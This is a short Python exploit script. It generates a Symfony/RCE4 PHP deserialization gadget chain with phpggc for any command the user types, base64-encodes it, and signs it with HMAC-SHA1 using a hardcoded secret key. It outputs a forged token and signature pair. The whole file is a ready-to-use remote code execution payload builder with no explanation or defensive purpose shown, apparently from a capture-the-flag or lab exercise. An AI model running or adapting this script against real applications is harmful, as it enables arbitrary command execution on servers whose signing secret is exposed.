#!/usr/bin/env python3
import base64
from hashlib import sha1
import hmac
import os

# import command to gen payload here
command = "phpggc Symfony/RCE4 exec \"%s\" | base64 | sed ':a;N;$!ba;s/\\n//g'"
user_cmd = input("Enter command: ")
# Gen phpggc payload
command = os.popen(command%user_cmd).read().rstrip('\n')
# changing value before using
secretkey = b'77xs6bs65rc8ldfzxe4af17ncmx3u0le'
b_cmd = str.encode(command)
# HMAC SHA1
hashed = hmac.new(secretkey, b_cmd, sha1)
# convert to hex format
hashed = hashed.digest().hex()
data = {'token':command,'sig_hmac_sha1':hashed}
print(str(data))